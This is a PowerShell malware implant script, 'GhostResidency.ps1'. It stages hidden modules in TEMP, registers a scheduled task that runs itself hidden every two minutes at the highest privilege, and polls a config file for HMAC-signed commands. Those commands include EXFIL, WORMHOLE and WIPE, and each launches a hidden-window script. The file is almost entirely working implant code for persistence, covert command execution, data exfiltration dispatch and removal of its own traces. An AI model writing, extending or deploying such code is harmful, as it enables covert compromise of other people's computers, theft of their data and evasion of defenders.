# GhostResidency.ps1
# Persistent implant loader and command handler
# Updated with logging, polymorph validation, and new module hooks

$cfgPath = "C:\ProgramData\.ghost.cfg"
$logScript = "$env:TEMP\GhostLogger.ps1"
$sealScript = "$env:TEMP\GhostSeal.ps1"
$exfilScript = "$env:TEMP\GhostHollow.ps1"
$polyScript = "$PSScriptRoot\GhostPolymorph.ps1"
$exorcistScript = "$PSScriptRoot\ExorcistMode.ps1"
$anomalyScript = "$PSScriptRoot\Modules\AnomalyHunter.ps1"
$wormholeScript = "$PSScriptRoot\Modules\Wormhole.ps1"
$pulseInterval = 60

function Deploy-Modules {
  Set-Content -Path $logScript -Value (Get-Content "$PSScriptRoot\GhostLogger.ps1") -Force
  Set-Content -Path $sealScript -Value (Get-Content "$PSScriptRoot\GhostSeal.ps1") -Force
  Set-Content -Path $exfilScript -Value (Get-Content "$PSScriptRoot\GhostHollow.ps1") -Force
}

function Write-GhostLog {
  param([string]$Message)
  $logFile = "C:\ProgramData\ghost_ops_log.txt"
  $timestamp = Get-Date -Format o
  Add-Content -Path $logFile -Value "[$timestamp] $Message"
}

function Handle-Command {
  param([string]$cmd, [string]$tag)
  Write-GhostLog "Received command: $cmd for tag: $tag"
  switch ($cmd.ToUpper()) {
    "LOG"       { powershell -WindowStyle Hidden -File $logScript -ghostTag $tag }
    "SEAL"      { powershell -WindowStyle Hidden -File $sealScript -ghostTag $tag }
    "EXFIL"     { powershell -WindowStyle Hidden -File $exfilScript -ghostTag $tag }
    "EXORCIST"  { powershell -WindowStyle Hidden -File $exorcistScript -Mode cleanse }
    "WORMHOLE"  { powershell -WindowStyle Hidden -File $wormholeScript }
    "ANOMALY"   { powershell -WindowStyle Hidden -File $anomalyScript }
    "WIPE"      {
      Remove-Item -Path $logScript, $sealScript, $exfilScript, $cfgPath -Force -ErrorAction SilentlyContinue
      Write-GhostLog "Wipe command executed"
    }
  }
}

function Set-Persistence {
  $taskName = "GhostPulse_$((Get-Random -Minimum 1000 -Maximum 9999))"
  SCHTASKS /Create /SC MINUTE /MO 2 /TN "$taskName" /TR "powershell -w hidden -f '$PSCommandPath'" /RL HIGHEST /F | Out-Null
  Write-GhostLog "Persistence set via task: $taskName"
}

function Pulse {
  while ($true) {
    if (Test-Path $cfgPath) {
      try {
        $cfg = Get-Content $cfgPath | ConvertFrom-Json
        $cmd = $cfg.command
        $tag = $cfg.ghostTag
        $sig = $cfg.signature
        $time = [datetime]::Parse($cfg.timestamp)

        # Signature check
        $key = 'RvL_0517'
        function X($d, $k) {
          $kb = [Text.Encoding]::UTF8.GetBytes($k)
          $db = [Text.Encoding]::UTF8.GetBytes($d)
          $h = New-Object Security.Cryptography.HMACSHA256
          $h.Key = $kb
          ([BitConverter]::ToString($h.ComputeHash($db))) -replace '-', ''
        }

        $expected = X "$cmd|$time" $key
        if ($expected -eq $sig -and ((Get-Date).ToUniversalTime().Subtract($time).TotalMinutes -lt 10)) {
          Handle-Command -cmd $cmd -tag $tag
          Remove-Item $cfgPath -Force
        }
      } catch {}
    }
    Write-GhostLog "Heartbeat pulse"
    Start-Sleep -Seconds $pulseInterval
  }
}

# === MAIN ===
Deploy-Modules
Set-Persistence

# Optional: polymorph and auto-run
$poly = & $polyScript
if ($poly -and $poly.exe -and $poly.dll) {
  Start-Process -WindowStyle Hidden -FilePath $poly.exe -ArgumentList $poly.dll
  $ghostTag = $poly.tag
} else {
  $ghostTag = "GHOST"
}

Write-GhostLog "GhostResidency initialized with tag: $ghostTag"
Pulse
